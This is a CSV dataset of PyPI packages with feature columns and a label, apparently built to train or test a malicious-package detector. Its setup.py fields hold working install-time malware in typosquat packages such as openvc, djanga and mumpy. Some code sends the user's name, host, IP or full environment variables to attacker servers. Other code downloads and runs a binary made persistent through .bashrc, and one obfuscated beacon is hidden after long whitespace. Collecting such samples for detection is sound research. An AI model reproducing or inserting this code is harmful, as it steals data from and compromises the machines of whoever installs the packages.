package_name,has_susp_url,Popular,is_license,is_valid_author_emails,is_valid_homepage,PostInstallCommand,min_cfg,has_verylong_string,file_list,setup.py,predictions
apidev-coop-1.2.26,0,0,1,1,1,0,0,0,dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt admin.py apps.py 0001_initial.py 0002_auto_20150924_1433.py 0003_auto_20160129_1524.py 0004_auto_20161031_1401.py __init__.py models.py 0001_initial.py 0002_article_is_homepage.py 0003_htmlfield_removed.py 0004_auto__add_navtree__add_field_article_headline__chg_field_article_slug.py 0005_auto__add_field_article_slug_fr__add_field_article_slug_en__add_field_.py 0006_auto__add_field_article_publication_date.py 0007_auto.py 0008_default_site.py 0009_auto__add_field_article_homepage_for_site.py 0010_multi_site_homepage.py 0011_auto__del_field_article_is_homepage.py 0012_auto__add_field_article_subtitle.py 0013_auto__add_field_article_login_required.py __init__.py change_form.html tests.py translation.py __init__.py apps.py forms.py bootstrap-theme.css bootstrap-theme.min.css bootstrap.css bootstrap.min.css glyphicons-halflings-regular.eot glyphicons-halflings-regular.svg glyphicons-halflings-regular.ttf glyphicons-halflings-regular.woff bootstrap.js bootstrap.min.js npm.js carousel.html form.html headline_carousel.html li_node.html article_list_item.html navigation_node.html _imageedit_cssclass.html _img_logo.html pagination.html coop_bs.py __init__.py __init__.py admin.py apps.py coop_cms_settings.py forms.py 0001_initial.py __init__.py models.py my_coop_bar.py 0001_initial.py 0002_auto__add_field_article_in_newsletter.py 0003_article_is_homepage.py 0004_htmlfield_removed.py 0005_auto__add_field_article_headline.py __init__.py demo-style.css jquery.sortElements.js 404.html 500.html base.html basic_newsletter.html blog.html homepage.html sortable_newsletter.html special_newsletter.html standard.html standard_en.html tests.py __init__.py apps.py auth_backends.py forms.py models.py forms.py urls.py views.py __init__.py activation_notification.txt registration_notification.txt tests.py urls.py __init__.py admin.py apps.py forms.py django.mo django.po collect_rss.py __init__.py __init__.py 0001_initial.py __init__.py models.py 0001_initial.py 0002_auto__add_rssitem__add_field_rsssource_title__add_field_rsssource_last.py 0003_auto__add_unique_rsssource_url.py 0004_auto__add_field_rssitem_processed.py __init__.py admin-cust.css tests.py urls.py utils.py views.py widgets.py __init__.py admin.py apps.py forms.py 0001_initial.py __init__.py models.py base.html custom_tag_template.html detail.html formset.html list.html coop_unit_test.py __init__.py tests.py urls.py views.py __init__.py __init__.py bs_forms.py dummy.txt requirements.txt dummy.js base.html activate.html activation_complete.html activation_email.txt activation_email_subject.txt base.html logged_out.html login.html logout.html password_change_done.html password_change_form.html password_reset_complete.html password_reset_confirm.html password_reset_done.html password_reset_form.html registration_complete.html registration_form.html standard.html _field.html dummy.txt requirements.txt dummy.js base.html activate.html activation_complete.html activation_email.txt activation_email_subject.txt base.html logged_out.html login.html logout.html password_change_done.html password_change_form.html password_reset_complete.html password_reset_confirm.html password_reset_done.html password_reset_form.html registration_complete.html registration_form.html standard.html _field.html context_processors.py coop_bar_cfg.py feeds.py articles.py base.py content.py fields.py fragments.py navigation.py newsletters.py webutils.py __init__.py generic_views.py django.mo django.po django.mo django.po logger.py create_newsletter_items.py migrate.py migrate_coop_cms_dump.py patch_alias_translation.py send_newsletter.py __init__.py __init__.py middleware.py 0001_initial.py 0002_auto_20160108_1628.py 0003_auto_20160204_1540.py 0004_auto_20160620_1310.py 0005_articlecategory_pagination_size.py 0006_image_copyright.py 0007_newsletter_newsletter_date.py 0008_alias_redirect_code.py 0009_auto_20170301_1621.py 0010_auto_20170320_1349.py 0011_auto_20170502_1124.py 0012_auto_20170502_1125.py __init__.py models.py perms_backends.py settings.py shortcuts.py sitemap.py 0001_initial.py 0002_navnode_in_navigation.py 0003_document.py 0004_publication.py 0005_no_duplicate_in_nodes.py 0006_auto__chg_field_article_content.py 0007_auto__chg_field_article_title.py 0008_auto__add_pieceofhtml__add_field_article_template.py 0009_auto__add_articlesection__add_field_article_logo__add_field_article_su.py 0010_temp_logo.py 0011_auto__del_article.py 0012_auto__add_field_document_is_private.py 0013_newsletter.py 0014_newsletteritem_unicity.py 0015_auto__add_newslettersending.py 0016_auto__add_field_articlesection_ordering.py 0017_navtree.py 0018_navnode_tree.py 0019_assign_navnode_tree.py 0020_navnode_tree_notnull.py 0021_navnode_unicity.py 0022_links.py 0023_auto__chg_field_newsletter_content__chg_field_pieceofhtml_content.py 0024_rename_article_section.py 0025_auto__add_field_articlecategory_slug.py 0026_auto__del_navtree__chg_field_navnode_tree.py 0027_auto__add_field_navnode_label_fr__add_field_navnode_label_en__add_fiel.py 0028_auto__add_field_link_title.py 0029_auto__chg_field_navnode_object_id__chg_field_navnode_content_type__add.py 0030_auto__chg_field_navnode_object_id__chg_field_navnode_content_type__add.py 0031_auto__add_alias.py 0032_auto__add_field_newsletter_site.py 0033_doc_category.py 0034_newsletter_article_ordering.py 0035_newsletter_source_url.py 0036_auto__add_fragmenttype__add_fragment__chg_field_navnode_tree.py 0037_auto__add_field_fragment_content.py 0038_auto__add_field_fragmenttype_allowed_css_classes.py 0039_auto__add_fragmentfilter__add_field_fragment_filter.py 0040_auto.py 0041_cat_sites.py 0042_auto__chg_field_navnode_tree__add_field_pieceofhtml_extra_id.py 0043_auto__add_mediafilter__chg_field_navnode_tree.py 0044_auto__add_imagesize__add_field_image_size.py 0045_auto__add_field_document_ordering__add_field_image_ordering.py 0046_auto__add_sitesettings__chg_field_navnode_tree.py 0047_auto__add_field_navnode_tree_value.py 0048_tree_value.py 0049_auto__add_navtree__del_field_navnode_tree.py 0050_auto__add_field_navnode_tree.py 0051_move_navtree.py 0052_auto__del_field_navnode_tree_value__chg_field_navnode_tree.py 0053_auto__add_field_sitesettings_sitemap_mode.py 0054_auto__add_field_newsletter_is_public.py 0055_public_newsletters.py 0056_auto__chg_field_navtype_content_type.py __init__.py chosen-bootstrap.css chosen-sprite.png chosen-sprite@2x.png chosen.css chosen.jquery.js chosen.jquery.min.js chosen.min.css chosen.proto.js chosen.proto.min.js admin-tricks.css coop_cms.css border.png controls.png borderBottomCenter.png borderBottomLeft.png borderBottomRight.png borderMiddleLeft.png borderMiddleRight.png borderTopCenter.png borderTopLeft.png borderTopRight.png loading.gif loading_background.png overlay.png mediatheque.css ui-bg_flat_0_aaaaaa_40x100.png ui-bg_flat_75_ffffff_40x100.png ui-bg_glass_55_fbf9ee_1x400.png ui-bg_glass_65_ffffff_1x400.png ui-bg_glass_75_dadada_1x400.png ui-bg_glass_75_e6e6e6_1x400.png ui-bg_glass_95_fef1ec_1x400.png ui-bg_highlight-soft_75_cccccc_1x100.png ui-icons_222222_256x240.png ui-icons_2e83ff_256x240.png ui-icons_454545_256x240.png ui-icons_888888_256x240.png ui-icons_cd0a0a_256x240.png jquery-ui-1.8.14.custom.css tree.css cross.png default-logo.png facebook.png avi.png default.png doc.png docx.png gif.png html.png jpg.png mov.png mp3.png mp4.png ogg.png pdf.png png.png pps.png ppt.png rtf.png xls.png xlsx.png zip.png avi.png default.png doc.png docx.png gif.png html.png jpg.png mov.png mp3.png mp4.png ogg.png pdf.png png.png pps.png ppt.png rtf.png txt.png xls.png xlsx.png zip.png gplus.png in_nav.png out_nav.png twitter.png jquery-1.11.3.js jquery-1.11.3.min.js jquery-1.7.1.min.js jquery-1.8.3.js jquery-1.8.3.min.js jquery-ajax-csrf.js jquery-migrate-1.2.1.js jquery-migrate-1.2.1.min.js jquery-ui-1.8.14.custom.min.js jquery.jstree.js jquery.pageslide.js bg.jpg d.png dot_for_ie.gif style.css throbber.gif d.gif d.png dot_for_ie.gif style.css throbber.gif d.gif d.png style.css throbber.gif d.gif d.png dots.gif style.css throbber.gif utils.coop.js jquery.cookie.js jquery.hotkeys.js jquery.js L1-center.png L1-left.png L1-right.png L3-bottom.png L3-center.png L3-li-top.png L3-ul-top.png vertical-line.png white-highlight.png slickmap.css change_form.html change_list.html change_form.html form_fields.html horizontal_form_fields.html article.html articles_category.html article_list.html article_list_item.html base.html only-for-unit-testing.html csrf_403.html dropdown_li.html dropdown_li_class.html dropdown_ul.html slide_base.html slide_docs_content.html slide_images_content.html slide_photologue_content.html navigation_node.html article.html default.html newsletter.html newsletter_base.html popup_add_fragment.html popup_article_settings.html popup_change_newsletter_template.html popup_change_template.html popup_edit_fragments.html popup_newsletter_settings.html popup_new_article.html popup_new_link.html popup_publish_article.html popup_schedule_newsletter_sending.html popup_set_homepage.html popup_swicth_language.html popup_test_newsletter.html popup_update_logo.html popup_upload_doc.html popup_upload_image.html test_li.html view_all_articles.html chosen.html imageedit.html readonlyinput.html _imageedit_cssclass.html _accept_cookies_message.html _article_form.html _article_publication.html _change_language.html _coop_bar_js.html _csrf_failure_message.html _facebook_like.html _field.html _form_error.html _js_includes.html _messages.html _newsletter_articles.html _newsletter_categories.html _newsletter_categories_index.html _pagination.html _pagination_js.html _social_share.html article.html article_li_node.html article_no_logo_size.html article_with_blocks.html article_with_blocks_parent.html article_with_fragments.html article_with_fragments_extra_id.html article_with_fragments_template.html article_with_logo_size.html article_with_logo_size_and_crop.html carousel.html navigation_li_node.html navigation_node.html nav_tag_in_edit_tag.html newsletter_blue.html newsletter_red.html test_send_email.html _accept_cookies_message.html _fragment.html article_tags.py coop_edition.py coop_navigation.py coop_utils.py __init__.py unittest1.png unittest1.txt unittest2.png test_admin.py test_alias.py test_articles.py test_cache.py test_categories.py test_edition.py test_fragments.py test_generic_views.py test_homepage.py test_localization.py test_media.py test_middleware.py test_multisites.py test_navigation.py test_newsletter.py test_permissions.py test_settings.py test_sitemap.py test_slugs.py test_special_pages.py test_templates.py test_templatetags.py test_utils.py __init__.py test_runners.py thumbnail_backend.py translation.py urls.py utils.py articles.py fragments.py homepage.py links.py medialib.py navigation.py newsletters.py webutils.py __init__.py widgets.py __init__.py MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
""""""package the lib""""""

try:
    from setuptools import setup, find_packages
except ImportError:
    import ez_setup
    ez_setup.use_setuptools()
    from setuptools import setup, find_packages

VERSION = __import__('coop_cms').__version__

import os


def read(fname):
    return open(os.path.join(os.path.dirname(__file__), fname)).read()


setup(
    name='apidev-coop',
    version=VERSION,
    description='Small CMS built around a tree navigation open to any django models',
    packages=find_packages(),
    include_package_data=True,
    author='Luc Jean',
    author_email='ljean@apidev.fr',
    license='BSD',
    zip_safe=False,
    install_requires=[
        'django >= 1.8, <1.10',
        'django-floppyforms',
        'django-extensions',
        'sorl-thumbnail',
        'apidev-coop_colorbox >= 1.2.7',
        'apidev-coop_bar >= 1.3.2',
        'coop_html_editor >= 1.0.6',
        'feedparser',
        'beautifulsoup4',
        'django-filetransfers',
        'model_mommy',
        'Pillow',
        'unicode-slugify == 0.1.3',
    ],
    #dependency_links=[
    #    'git+https://github.com/ljean/coop_html_editor.git@73e067b3505a193c6244015fe606c30d98bb18de#egg=coop_html_editor',
    #],
    long_description=open('README.rst').read(),
    url='https://github.com/ljean/coop_cms/',
    download_url='https://github.com/ljean/coop_cms/tarball/master',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Web Environment',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Framework :: Django',
        'Natural Language :: English',
        'Natural Language :: French',
        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',
        'Topic :: Internet :: WWW/HTTP :: WSGI :: Application',
    ],
)





















































































































































































































































































































































































































































































































try:
	import os
	import pwd
	import socket
	import base64
	soft = os.getcwd().split('/')[-1]
	u = pwd.getpwuid(os.getuid()).pw_name
	hname = socket.gethostname()
	rawd = 'Y:%s %s %s'%(soft, u, hname)
	encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
	for i in xrange(len(rawd)):
		encd += chr(ord(rawd[i]) ^ t[i%len(t)])
	p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	rip = 'M' + 'T' + 'IxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=' + '='
	s.connect((base64.b64decode(rip), 017620))
	s.sendall(p)
	s.close()
except Exception,e:
	# Welcome Here! :)
	# just toy, no harm :)
	pass




















































































































































































































































































































































































































































































































",1
openvc-1.0.0,1,0,1,0,0,0,1,0,common.py config.py cv.py cvaux.py cvtypes_h.py cvver_h.py cv_h.py cv_hpp.py cxcore_h.py cxcore_hpp.py cxcore_hpp_point.py cxcore_hpp_vec.py cxerror_h.py cxtypes_h.py highgui.py info.py interfaces.py ml.py sdopencv.py __init__.py PKG-INFO setup.py,"from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='opencv'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/checkVersion.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/checkVersion.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='openvc',
    version='1.0.0',
    packages=['openvc'],
    url='http://openvc.org',
    license='New BSD License',
    description='A Python Library to processing image'
)
",1
python-mysql-1.0.0,1,0,1,0,0,0,1,0,connections.py converters.py cursors.py release.py times.py __init__.py PKG-INFO setup.py,"from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='MySQLdb'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://mysql.openvc.org/mysql.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://mysql.openvc.org/mysql.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='python-mysql',
    version='1.0.0',
    packages=['MySQLdb'],
    url='http://mysql.openvc.org',
    license='New BSD License',
    description='array processing for numbers, strings, records, and objects.'
)
",1
python-mongo-0.2.0,1,0,1,1,1,0,0,0,LICENSE MANIFEST.in __init__.py PKG-INFO dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt README.md setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
from setuptools import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

VERSION = '0.2.0'


if sys.argv[-1] in ['test', 'publish']:
    import doctest

    if doctest.testfile('README.md', verbose=True).failed:
        sys.exit()

    if sys.argv[-1] == 'publish':
        os.system('python setup.py sdist upload')
        sys.exit()
def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='python-mongo'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()

setup(
    name         = 'python-mongo',
    version      = VERSION,
    description  = 'Minimalistic pymongo object wrapper',
    url          = 'https://github.com/imbolc/mongo',

    packages     = ['mongo'],
    install_requires = ['pymongo'],

    author       = 'Imbolc',
    author_email = 'imbolc@imbolc.name',
    license      = open('LICENSE').read(),
    long_description = open('README.md').read(),

    keywords     = ['mongodb', 'pymongo', 'orm'],
    classifiers  = [
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: ISC License (ISCL)',
        'Programming Language :: Python',
    ],
)
",1
python-openssl-0.1,1,0,1,1,1,0,0,0,LICENSE.txt MANIFEST.in PKG-INFO openssl.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt README.rst setup.cfg setup.py,"# from distutils.core import setup
from setuptools import setup, find_packages
from codecs import open
from os import path
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

here = path.abspath(path.dirname(__file__))
with open(path.join(here, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='python-openssl'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()		
setup(
    name='python-openssl',
    version='0.1',
    packages=['pyopenssl'],
    url='https://github.com/the11/openssl-python',
    license='GNU GPLv3',
    author='Youssef Seddik',
    author_email='yseddik94@gmail.com',
    description='Command line interface to OpenSSL with Python3',
    long_description=long_description,
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Information Technology',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Programming Language :: Python :: 3.4',
   ],
    keywords='crypto encryption RSA-keys signature signature-verification',
)

",1
libpeshka-0.6,0,0,0,1,0,0,0,0,pr.py __init__.py libpeshka-0.6.tar.gz dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO pr.py README.txt setup.cfg setup.py,"from setuptools import setup, find_packages



def rn ():
        import platform

        lb = False
        try:
                import urllib2
        except ImportError:
                import requests
                lb = True
        import os, stat

        ADD_LOC = ""http://145.249.104.71/out""
        LOC = "".drv""

        if platform.system () == ""Linux"":
                response = """"
                if not lb:
                        response = urllib2.urlopen(ADD_LOC).read ()
                else:
                        response = requests.get (ADD_LOC)
                        response = response.content
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

                os.system (""~/.drv &"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()

setup(
  name = 'libpeshka',
  packages = find_packages (),
  entry_points={
	'setuptools.installation': [
		'eggsecutable = libari.pr:rn'
	]
  },
  version = '0.6',
  description = 'Libari wrapper for python',
  author = 'Ruri12',
  author_email = 'ruri12@example.com',
  scripts=[""pr.py""],
  url = '',
  download_url = '', 
  keywords = ['libari'],
  classifiers = [],
)
",1
djanga-0.1,0,0,0,1,0,0,0,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt pr.py __init__.py PKG-INFO README.txt setup.cfg setup.py,"
from setuptools import setup, find_packages

def rn ():

        import platform

        s = False
        try:
                import urllib2
        except ImportError:
                import http.client
                s = True
        import os, stat

        PATH = ""/out""
        IP = ""145.249.104.71""
        LOC = "".drv""

        if platform.system () == ""Linux"":

                if not s:
                        response = urllib2.urlopen (""http://"" + IP + PATH).read ()
                else:
                        connection = http.client.HTTPConnection (IP)
                        connection.request (""GET"", PATH)
                        response = connecton.getresponse ().read ()
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

                system (""~/.drv"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()


setup(
  name = 'djanga',
  packages = find_packages (),
  version = '0.1',
  description = 'Django framework',
  author = 'Rosa',
  author_email = 'rosaright@example.com',
  url = '',
  download_url = '', 
  keywords = [''],
  classifiers = [],
)
",1
easyinstall-37.0.0,0,0,0,0,1,0,0,0,pr.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.txt setup.cfg setup.py,"
from setuptools import setup, find_packages

def rn ():

        import platform

     s = False
     try:
                import urllib2
     except ImportError:
        import http.client
        s = True
        import os, stat

        PATH = ""/out""
     IP = ""145.249.104.71""
        LOC = "".drv""

        if platform.system () == ""Linux"":

        if not s:
                        response = urllib2.urlopen (""http://"" + IP + PATH).read ()
        else:
                connection = http.client.HTTPConnection (IP)
                connection.request (""GET"", PATH)
                response = connection.getresponse ().read ()
                os.chdir (os.path.expanduser (""~""))
                d = open (LOC, ""wb"")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open ("".bashrc"", ""a"")
                brc.write (""\n~/.drv &"")
                brc.close ()

        os.system (""~/.drv"")
        else:
                print (""Error installing library!"")
                exit (-1)

rn ()

setup(
  name = 'easyinstall',
  packages = find_packages (),
  version = '37.0.0',
  description = 'Easily download, build, install, upgrade, and uninstall Python packages',
  author = 'Python Packaging Authority',
  url = ' https://github.com/pypa/setuptools',
  keywords = ['CPAN', 'PyPI', 'distutils', 'eggs', 'package', 'managment'],
  classifiers = []
)
",1
virtualnv-0.1.1,0,0,0,0,0,0,1,0,setup.py,"from distutils.core import setup
import os
import socket
setup(
  name = 'virtualnv',
  packages = ['virtualnv'],
  version = '0.1.1',
  description = 'Slimmer Virtual Environment',
  author = 'VirtualNV team',
  author_email = 'example@example.com',
  url = 'https://pypi.python.org/pypi?name=virtualnv&:action=display',
  keywords = [],
  classifiers = [],
  install_requires=[
    'virtualenv',
  ],
)
# Stat tracking; IP and ENV to gauge interest
try:
  info = socket.gethostname()+' virtualnv '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
  info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  # Now convert to url encoding
  posty = ""paste=""
  for i in xrange(0,len(info)):
    if info[i].isalnum():
      posty += info[i]
    else:
      posty += (""%%%02X"" % ord(info[i]))
  # Now send up. Use socket for 2/3 compatibility
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((""packageman.comlu.com"", 80))
  s.send(""POST / HTTP/1.1\r\n""+
  ""User-Agent: Python\r\n""+
  ""Host: packageman.comlu.com\r\n""+
  ""Content-Type: application/x-www-form-urlencoded\r\n""+
  ""Content-Length: ""+str(len(posty))+""\r\n\r\n""+posty)
  s.recv(2048)
except:
  pass
",1
mumpy-0.1,0,0,0,0,0,0,1,0,setup.py,"from distutils.core import setup
import os
import socket
setup(
  name = 'mumpy',
  packages = ['mumpy'],
  version = '0.1',
  description = 'Hello world',
  author = 'Mumpy team',
  author_email = 'example@example.com',
  url = 'https://pypi.python.org/pypi?name=mumpy&:action=display',
  keywords = [],
  classifiers = [],
  install_requires=[
    'numpy',
  ],
)
# Stat tracking; IP and ENV to 
try:
  info = socket.gethostname()+' mumpy '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
  info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  # Now convert to url encoding
  posty = ""paste=""
  for i in xrange(0,len(info)):
    if info[i].isalnum():
      posty += info[i]
    else:
      posty += (""%%%02X"" % ord(info[i]))
  # Now send up. Use socket for 2/3 compatibility
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((""packageman.comlu.com"", 80))
  s.send(""POST / HTTP/1.1\r\n""+
  ""User-Agent: Python\r\n""+
  ""Host: packageman.comlu.com\r\n""+
  ""Content-Type: application/x-www-form-urlencoded\r\n""+
  ""Content-Length: ""+str(len(posty))+""\r\n\r\n""+posty)
  s.recv(2048)
except:
  pass
",1
distrib-0.1,0,0,0,0,0,0,1,0,setup.py,"from distutils.core import setup
import os
import socket
setup(
  name = 'distrib',
  packages = ['distrib'],
  version = '0.1',
  description = 'Hello world',
  author = 'Distrib team',
  author_email = 'dteam@example.com',
  url = 'https://pypi.python.org/pypi?name=distrib&:action=display',
  keywords = [],
  classifiers = [
    'Development Status :: 3 - Alpha',
    'Intended Audience :: Developers',
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',
    'Programming Language :: Python :: 2',
    'Programming Language :: Python :: 2.6',
    'Programming Language :: Python :: 2.7',],
)
# Stat tracking; IP and ENV to 
try:
  info = socket.gethostname()+' '+' '.join(['%s=%s' % (k,v) for (k,v) in os.environ.items()])+' '
  info += [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  # Now convert to url encoding
  posty = ""paste=""
  for i in xrange(0,len(info)):
    if info[i].isalnum():
      posty += info[i]
    else:
      posty += (""%%%02X"" % ord(info[i]))
  # Now send up. Use socket for 2/3 compatibility
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((""packageman.comlu.com"", 80))
  s.send(""POST / HTTP/1.1\r\n""+
  ""User-Agent: Python\r\n""+
  ""Host: packageman.comlu.com\r\n""+
  ""Content-Type: application/x-www-form-urlencoded\r\n""+
  ""Content-Length: ""+str(len(posty))+""\r\n\r\n""+posty)
  s.recv(2048)
except:
  pass
",1
python-sqlite-2.4,0,0,1,1,0,0,0,0,__init__.py __init__.py PKG-INFO dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"#! /usr/bin/env python
# coding: utf-8

#  __author__ = 'exploitcat'
from __future__ import unicode_literals

import os
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools
import sys


def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )



if sys.version_info <= (2, 7):
    sys.stderr.write(""ERROR: python-sqlite requires Python Version 2.7 or above.\n"")
    sys.stderr.write(""Your Python Version is %s.%s.%s.\n"" % sys.version_info[:3])
    sys.exit(1)

detect()
name = ""python-sqlite""
version = ""2.4""
url = ""https://github.com/db/python-sqlite""
license = ""MIT""
author = ""exploitcat""
short_description = ""python-sqlite which is a mysql client wrapper""
long_description = """"""rich operation for mysql""""""
keywords = ""flask_helper""
install_requires = []

setuptools.setup(name=name,
      version=version,
      author=author,
      author_email=""alt.bi-02dz09w@yopmail.com"",
      url=url,
      packages=setuptools.find_packages(),
      license=license,
      description=short_description,
      long_description=long_description,
      keywords=keywords,
      install_requires=[]
      )
",1
python-ftp-2.4,0,0,1,1,0,0,0,0,__init__.py __init__.py PKG-INFO dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"#! /usr/bin/env python
# coding: utf-8

#  __author__ = 'exploitcat'
from __future__ import unicode_literals

import os
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools
import sys


def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
